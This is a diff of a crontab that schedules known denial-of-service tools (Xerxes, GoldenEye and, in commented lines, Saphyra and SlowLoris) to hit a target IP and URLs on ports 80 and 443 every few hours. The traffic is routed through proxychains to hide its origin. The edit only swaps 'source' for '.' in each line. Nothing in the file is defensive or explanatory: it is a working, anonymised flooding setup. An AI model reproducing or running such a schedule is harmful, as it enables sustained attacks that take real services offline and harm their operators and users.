@@ -1,17 +1,17 @@
 # Saphyra
-#* */2 * * * source /etc/profile.d/target.env; pkill -f saphyra.py; sleep 30; proxychains4 -q python3 /usr/local/bin/saphyra.py "$TARGET_URL_HTTP"
+#* */2 * * * . /etc/profile.d/target.env; pkill -f saphyra.py; sleep 30; proxychains4 -q python3 /usr/local/bin/saphyra.py "$TARGET_URL_HTTP"
 
 # Xerxes (port 80)
-* */6 * * * source /etc/profile.d/target.env; pkill -f xerxes; sleep 30; proxychains4 -q /usr/local/bin/xerxes "$TARGET_IP" 80
+* */6 * * * . /etc/profile.d/target.env; pkill -f xerxes; sleep 30;proxychains4 -q /usr/local/bin/xerxes "$TARGET_IP" 80
 
 # Xerxes (port 443)
-* */6 * * * source /etc/profile.d/target.env; sleep 30; proxychains4 -q /usr/local/bin/xerxes "$TARGET_IP" 443
+* */6 * * * . /etc/profile.d/target.env; sleep 30; proxychains4 -q /usr/local/bin/xerxes "$TARGET_IP" 443
 
 # GoldenEye (random HTTP method)
-* */12 * * * source /etc/profile.d/target.env; pkill -f goldeneye.py; sleep 30; proxychains4 -q python3 /usr/local/bin/goldeneye.py "$TARGET_URL_HTTP" -m random -s 25
+* */12 * * * . /etc/profile.d/target.env; pkill -f goldeneye.py; sleep 30; proxychains4 -q python3 /usr/local/bin/goldeneye.py "$TARGET_URL_HTTP" -m random -s 25
 
 # GoldenEye (random HTTPS method)
-* */12 * * * source /etc/profile.d/target.env; pkill -f goldeneye.py; sleep 30; proxychains4 -q python3 /usr/local/bin/goldeneye.py "$TARGET_URL_HTTPS" -m random -s 25
+* */12 * * * . /etc/profile.d/target.env; pkill -f goldeneye.py; sleep 30; proxychains4 -q python3 /usr/local/bin/goldeneye.py "$TARGET_URL_HTTPS" -m random -s 25
 
 # SlowLoris
-#* */12 * * * source /etc/profile.d/target.env; pkill -f slowloris.py; sleep 30; proxychains4 -q python3 /usr/local/bin/slowloris.py "$TARGET_URL"
+#* */12 * * * . /etc/profile.d/target.env; pkill -f slowloris.py; sleep 30; proxychains4 -q python3 /usr/local/bin/slowloris.py "$TARGET_URL"
